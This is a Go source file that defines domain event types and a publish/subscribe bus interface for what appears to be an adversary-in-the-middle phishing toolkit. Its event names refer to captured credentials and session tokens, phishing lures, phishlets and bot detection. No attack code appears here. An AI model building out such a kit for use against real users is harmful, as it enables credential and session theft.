package aitm

import "time"

// EventType identifies a domain event.
type EventType string

const (
	EventSessionCreated   EventType = "session.created"
	EventCredsCaptured    EventType = "session.creds_captured"
	EventTokensCaptured   EventType = "session.tokens_captured"
	EventSessionCompleted EventType = "session.completed"
	EventLureHit          EventType = "lure.hit"
	EventBotDetected      EventType = "botguard.detected"
	EventPhishletReloaded EventType = "phishlet.reloaded"
	EventDNSRecordSynced  EventType = "dns.synced"
)

// Event is a domain event published to the bus.
type Event struct {
	Type       EventType
	OccurredAt time.Time
	Payload    any
}

// EventBus is the publish/subscribe interface for decoupling components.
// Implementations must be safe for concurrent use.
// Publish must never block — if a subscriber's channel is full, the event is dropped.
type EventBus interface {
	Publish(e Event)
	Subscribe(t EventType) <-chan Event
	Unsubscribe(t EventType, ch <-chan Event)
}
